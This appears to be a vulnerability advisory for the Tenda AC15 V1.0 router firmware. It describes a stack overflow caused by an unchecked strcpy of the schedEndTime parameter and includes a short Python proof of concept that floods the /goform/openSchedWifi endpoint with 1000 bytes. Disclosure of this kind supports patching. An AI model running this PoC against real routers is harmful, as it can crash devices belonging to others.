## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `setSchedWifi` function. The `v20` variable receives the `schedEndTime` parameter from a POST request and is later assigned to the `ptr` variable, which is fixed at 25 bytes. However, since the user can control the input of `schedEndTime`, the statement `strcpy((char *)ptr + 10, v20);` can cause a buffer overflow. The user-provided `schedEndTime` can exceed the capacity of the `ptr` array, triggering this security vulnerability.

![image-20240305225509194](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305225509194.png)

![image-20240305225530022](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305225530022.png)

![image-20240314175401980](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314175401980.png)

![image-20240305225551018](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305225551018.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/openSchedWifi"
payload = b"a"*1000

data = {"schedWifiEnable":0,"schedEndTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314175449987.png)
